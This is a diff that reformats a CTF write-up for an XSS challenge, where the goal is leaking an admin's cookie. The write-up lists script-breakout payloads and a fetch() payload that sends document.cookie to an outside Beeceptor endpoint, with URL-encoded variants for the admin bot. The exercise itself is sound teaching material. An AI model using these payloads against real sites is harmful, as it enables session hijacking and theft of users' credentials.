@@ -12,7 +12,7 @@ date: 2023-02-13
 Challenge: https://particles.ctf.zoolab.org
 
 ## Description
-The website can change the theme of layout. The main goal is to leak admin's cookie.
+The website can change the theme of layout. The main goal is to leak admin's cookie. 
 
 ## Exploit - XSS
 1. Use burp suit to check if the website has XSS vulnerability.
@@ -21,6 +21,7 @@ The website can change the theme of layout. The main goal is to leak admin's coo
 2. Try to modify `config` parameter
     * Payload 1: `1;alert(123);console.log({x://\`
     * Response 1
+
         ```javascript
         ...
         <script>
@@ -36,6 +37,7 @@ The website can change the theme of layout. The main goal is to leak admin's coo
     or
     * Payload 2: `</script><script>alert(123);</script>`
     * Response 2
+
         ```javascript
         ...
         <script>
@@ -58,6 +60,7 @@ The website can change the theme of layout. The main goal is to leak admin's coo
     or
     * Payload 3: `</script><script>alert(123);</script><script>console.log({x://`
     * Response 3
+
         ```javascript
         ...
         <script>
@@ -82,10 +85,11 @@ The website can change the theme of layout. The main goal is to leak admin's coo
     ![](https://i.imgur.com/yDcnYv8.png)
 
 3. `fetch` + [`Beeceptor`](https://beeceptor.com/)
-    * Payload: 
-    ```javascript
-    </script><script>fetch(%22https://sbk6401.free.beeceptor.com?%22%2bdocument.cookie);</script>
-    ```
+    * Payload:
+
+        ```javascript
+        </script><script>fetch(%22https://sbk6401.free.beeceptor.com?%22%2bdocument.cookie);</script>
+        ```
     **<font color="FF0000">Note that:</font>** MUST TRANSFER `+` AND `"` TO `%2B` AND `%22` RESPECTIVELY
     URL: 
     ```!
@@ -95,6 +99,7 @@ The website can change the theme of layout. The main goal is to leak admin's coo
 
 4. Report to author: Must encoded by [`URL encode`](https://www.urlencoder.org/)
     * Payload:
+
     ```
     https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbkkk.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E
     ```
@@ -103,10 +108,12 @@ The website can change the theme of layout. The main goal is to leak admin's coo
 
 * Other payload:
     * Payload 2
+
         ```
         url=https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbk6401.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E%3Cscript%3Econsole.log%28%7Bx%3A%2F%2F
         ```
     * Payload 3
-    ```
-    url=https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbk6401.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E
-    ```
+    
+        ```
+        url=https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbk6401.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E
+        ```
